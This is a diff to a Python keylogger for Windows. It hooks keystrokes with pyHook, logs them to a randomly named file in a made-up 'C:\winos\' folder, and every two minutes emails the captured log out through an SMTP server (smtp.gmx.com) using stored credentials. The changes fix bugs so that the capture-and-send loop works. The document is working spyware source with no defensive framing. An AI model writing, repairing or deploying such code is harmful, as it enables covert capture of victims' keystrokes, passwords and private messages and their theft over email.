@@ -18,8 +18,11 @@ global logfile
 def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
 
-temp_path = os.getenv('TEMP')
-logfile = temp_path + "\\" + id_generator(15)
+directory = "C:\\winos\\"
+
+if not os.path.exists(directory):
+    os.makedirs(directory)
+logfile = directory + "\\" + id_generator(15)
 
 f = open(logfile,"a")
 f.write("")
@@ -75,7 +78,7 @@ def keylogger():
         else:
             data += keyboardKeyName
         f = open(logfile,"a")
-        f.write(keylogs)
+        f.write(data)
         f.close()
 
     hm = pyHook.HookManager()
@@ -85,8 +88,8 @@ def keylogger():
 
 
 def mailsender():
-    mail = 'xxxx'
-    password = 'xxxx'
+    mail = EEMAIL
+    password = EPASS
 
     while 1:
         time.sleep(120)
@@ -94,15 +97,15 @@ def mailsender():
         msg = MIMEText(fo.read())
         fo.close()
 
-        if len(msg) > 30:
+        if len(msg.as_string()) > 30:
             timeInSecs = datetime.datetime.now()
             msg['Subject'] = 'B33: ' + timeInSecs.isoformat()
             msg['From'] = mail
             msg['To'] = mail
 
             try:
-                #s = smtplib.SMTP('smtp.gmx.com:25')
-                s = smtplib.SMTP_SSL('smtp.gmail.com:587')
+                s = smtplib.SMTP('smtp.gmx.com:25')
+                # s = smtplib.SMTP_SSL('smtp.gmail.com:587')
                 s.login(mail,password)
                 s.sendmail(mail, [mail], msg.as_string())
                 s.close()
